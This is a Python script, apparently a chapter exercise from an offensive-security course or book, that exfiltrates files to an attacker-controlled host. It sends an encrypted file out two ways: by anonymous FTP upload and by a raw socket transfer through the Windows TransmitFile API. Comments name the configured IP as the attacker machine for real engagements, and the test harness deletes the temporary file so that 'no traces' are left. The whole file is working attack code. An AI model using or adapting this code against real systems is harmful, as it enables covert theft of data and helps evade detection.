import ftplib
import os
import socket
import win32file

# =============================================
# CONFIGURATION
# 127.0.0.1 = localhost (our own machine for testing)
# In real engagement = attacker machine IP
# =============================================
FTP_SERVER    = '10.79.208.142'
SOCKET_SERVER = '10.79.208.142'
SOCKET_PORT   = 10000


# =============================================
# METHOD 1: Plain FTP — Cross Platform
# Sends encrypted file to FTP server
# =============================================
def plain_ftp(docpath, server=FTP_SERVER):
    ftp = ftplib.FTP()
    ftp.connect(server, 2121)      # ← add port 2121 here
    ftp.login('anonymous', 'anon@example.com')
    ftp.cwd('/')                   # ← change to / instead of /pub/
    ftp.storbinary(
        'STOR ' + os.path.basename(docpath),
        open(docpath, 'rb'),
        1024
    )
    ftp.quit()
    print(f'[+] File uploaded via FTP!')


# =============================================
# METHOD 2: Raw Socket Transmit — Windows Only
# Uses win32file.TransmitFile Windows API
# Very efficient — kernel level file transfer
# =============================================
def transmit(document_path):
    print(f'[*] Connecting to socket listener: {SOCKET_SERVER}:{SOCKET_PORT}')
    
    # Create socket and connect to listener
    client = socket.socket()
    client.connect((SOCKET_SERVER, SOCKET_PORT))
    print('[+] Socket connection established')
    
    # Open file and transmit using Windows API
    with open(document_path, 'rb') as f:
        win32file.TransmitFile(
            client,                                    # socket
            win32file._get_osfhandle(f.fileno()),     # file handle
            0,                                         # bytes to send (0=all)
            0,                                         # bytes per send
            None,                                      # overlapped
            0,                                         # flags
            b'',                                       # head
            b''                                        # tail
        )
    
    client.close()
    print(f'[+] File transmitted via socket: {document_path}')


# =============================================
# TESTING
# =============================================
if __name__ == '__main__':
    from cryptor import encrypt
    
    # ---- STEP 1: Create a test file to exfiltrate ----
    test_file = 'C:\\Users\\Downloads\\chapter9\\secret_test.txt'
    
    with open(test_file, 'w') as f:
        f.write('TOP SECRET: This file was exfiltrated!')
    
    print(f'[*] Created test file: {test_file}')
    
    # ---- STEP 2: Read and encrypt the file ----
    with open(test_file, 'rb') as f:
        contents = f.read()
    
    encrypted_contents = encrypt(contents)
    print(f'[*] File encrypted successfully')
    
    # ---- STEP 3: Write encrypted version to temp file ----
    encrypted_file = 'C:\\Windows\\Temp\\secret_test.enc'
    
    with open(encrypted_file, 'wb') as f:
        f.write(encrypted_contents)
    
    print(f'[*] Encrypted file saved to: {encrypted_file}')
    
    # ---- STEP 4: Choose your method ----
    print('\n[*] Testing METHOD 1: FTP Upload...')
    plain_ftp(encrypted_file)
    
    print('\n[*] Testing METHOD 2: Raw Socket...')
    transmit(encrypted_file)
    
    # ---- STEP 5: Cleanup temp file ----
    os.unlink(encrypted_file)
    print('\n[+] Temp file deleted — no traces left')
    
    print('\n[+] ALL DONE!')



    